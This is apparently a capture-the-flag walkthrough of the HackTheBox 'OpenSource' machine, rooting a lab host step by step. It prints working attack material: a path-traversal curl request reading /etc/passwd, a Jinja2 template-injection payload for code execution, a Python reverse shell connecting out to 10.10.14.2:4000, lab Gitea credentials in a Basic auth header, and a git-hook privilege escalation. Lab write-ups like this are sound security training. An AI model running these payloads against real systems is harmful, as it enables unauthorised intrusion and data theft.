---
title: "HackTheBox: \"OpenSource\" Walkthrough"
date: 2022-06-09
tags: ['hackthebox', 'ctf']
categories: ["HackTheBox Walkthrough"]
slug: "hackthebox-opensource-walkthrough"
draft: true
---

Knowledge of Python and the Jinja2 template engine is definitely helpful.<!--more-->

## Foothold

We start with the usual `nmap` scan:

```plain
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp
```

As for almost every machine, port 22 and 80 are open. But there is also
a "filtered" port - we can't do anything with it right now, but we should
keep it in mind for later.

Visiting the website, we find some kind of minimalistic "cloud service":
We can upload and download files, but we can also download the source code
of the application - time for some code review 😉

The application seems to be running inside a Docker container, using the
`python:3-alpine` image. There is an upload and a download route defined
and both use a custom function to sanitize paths:

```python
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")

def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

The download route is implemented like this:
```python
@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

Time to read the [python documentation](https://docs.python.org/3/library/os.path.html#os.path.join)
for `os.path.join`:

> Join one or more path components intelligently. The return value is the concatenation of path and any members of *paths with exactly one directory separator following
each non-empty part except the last, meaning that the result will only end in a separator if the last part is empty. **If a component is an absolute path, all
previous components are thrown away** and joining continues from the absolute path component.
>


I have highlighted the important part. Let's see what this means:

```plain
>>> os.path.join(os.getcwd(),'foobar')
'/home/kali/foobar'
>>> os.path.join(os.getcwd(),'/foobar')
'/foobar'
```

Now we have to build an URL that is both captured by the `<path:path>` filter
of the route and allows path traversal. We know that the sequence `../` is removed
(replaced by an empty string), so we try the following request (note that `%2f` is
the encoded variant of `/`):

```plain
$ curl 'http://10.10.11.164/uploads/..%2f/etc/passwd'
root:x:0:0:root:/root:/bin/ash
[...]
```

Great! We can read arbitrary files - and because the upload uses the same way
to "sanitize" file names/paths, we can also upload arbitrary files. But
as we are inside a container, this is of limited use - we can't just upload
our SSH public key and have root access. Having shell access is always useful,
so let's try that next.

After doing a bit of research, I found that there are multiple ways to execute
code in a Jinja2 template. Let's create a file with the following contents:

```plain
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

And upload it, overwriting the existing template that is shown after a file
was uploaded:

```plain
$ curl -F file='@payload-id;filename=..//app/app/templates/success.html' http://10.10.11.164/upcloud
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

At this point, I played around a lot to get a working reverse shell - mostly
by trying to replace the `id` command with one of the usual `nc`/`sh` commands,
but none of that worked. So I did a bit more research and found that Jinja2
allows to load "config" files inside a template, which are basically Python
files that are executed. So I uploaded a file with the following contents:

```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.2",4000));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
import pty;
pty.spawn("sh")
```

And also replaced the `success.html` template on the server with a file with the
following contents:

```plain
{{ config.from_pyfile('templates/payload.py') }}
```

Success - we have a working reverse shell.

# User

We are still inside the docker container. Remember that filtered port we found
at the start? As it's supposedly a service that is running on the host, not
inside the docker container, we can use the `ip route` command to get the
gateway IP address - which allows us to access the host system. Running `wget`
against that IP and port 3000, we find a Gitea installation. Gitea of course
has an [API](https://docs.gitea.io/en-us/api-usage/#api-guide), so let's use
that API to explore the Gitea instance. There are no publicly accessible repos,
and the installed version is 1.16.6, which does not seem to be exploitable.

So this looks like a dead end - but that's unlikely, at least in this scenario
(an "easy" difficulty HackTheBox machine), where every service exists for a reason.
We likely overlooked something: Inside the source code download there was
also a `.git` folder and I *did* check the history for removed credentials.
But I did *not* check if there is more than one branch. Turns out: there is
another branch with a few commits - and one of it has credentials in it!

Let's use those credentials to authenticate against Gitea:

```plain
wget -O- --header='Content-Type: application/json' --header='Accept: application/json' \
--header='Authorization: Basic ZGV2MDE6U291bGxlc3NfRGV2ZWxvcGVyIzIwMjI=' 'http://172.17.0.1:3000/api/v1/user/repos'
```

Here we go - that user has a private repository. Reading a bit more through
the Gitea API docs, we find a way to download that repository (after finding out
which branches exist in that repository).

```plain
wget --header='Content-Type: application/json' --header='Accept: application/json' \
--header='Authorization: Basic ZGV2MDE6U291bGxlc3NfRGV2ZWxvcGVyIzIwMjI=' \
'http://172.17.0.1:3000/api/v1/repos/dev01/home-backup/archive/main.zip'
```

We can now easily download that zip file using the running web application.
The file seemingly contains a backup of the user's home folder and includes
a private SSH key (`id_rsa`). We extract that key and can login to the host
machine using SSH! (Don't forget to `chmod 600` the key file, otherwise the `ssh`
command will reject it.)

# Root

First step to get root access: Running LinPEAS 😀 Unfortunately, there
was nothing obvious standing out. Fortunately, we have another tool to get
more insight into a machine: [pspy](https://github.com/DominicBreuker/pspy).
After starting it, we don't have to wait long until something *very* interesting
happens:

```plain
2022/06/08 22:51:01 CMD: UID=0    PID=21785  | /bin/bash /usr/local/bin/git-sync
2022/06/08 22:51:01 CMD: UID=0    PID=21784  | /bin/sh -c /usr/local/bin/git-sync
2022/06/08 22:51:01 CMD: UID=0    PID=21783  | /usr/sbin/CRON -f
2022/06/08 22:51:01 CMD: UID=0    PID=21786  | git status --porcelain
2022/06/08 22:51:01 CMD: UID=0    PID=21788  | git add .
2022/06/08 22:51:01 CMD: UID=0    PID=21789  | git commit -m Backup for 2022-06-08
2022/06/08 22:51:01 CMD: UID=0    PID=21790  | git push origin main
```

The source of `git-sync`:

```bash
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

So this script makes "backups" of the home directory using git - and is running
as root user! Now we only need to make git run arbitrary code - which is rather
easy by using [hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks).
In `~/.git/hooks/`, we create a file `post-commit` (it's possible to use another hook,
this one was chosen for no particular reason - also don't forget to `+x` the file):

```bash
cp /root/root.txt /home/dev01/root.txt
chmod o+r /home/dev01/root.txt
```

Now we just need that `git-sync` script to make a commit, which we can trigger
by modifying something in the home directory (e.g. `touch foo`). After
waiting a moment, the `root.txt` appears in our home directory - readable by
everyone. Done!

## Conclusion and Learnings

When reading a Walkthrough like this, it may look like a straight path, which
is almost never true. For example I spent a lot of time looking for ways
to escape the Docker container. It took a while until I had a second look
at the downloaded git repository and found the second branch containing
the Gitea credentials - trying to escape the Docker container was a dead end.
Furthermore, I probably spent half the time on this machine on getting
the reverse shell working. I had no experience exploiting Jinja2 before, so
this was definitely a learning.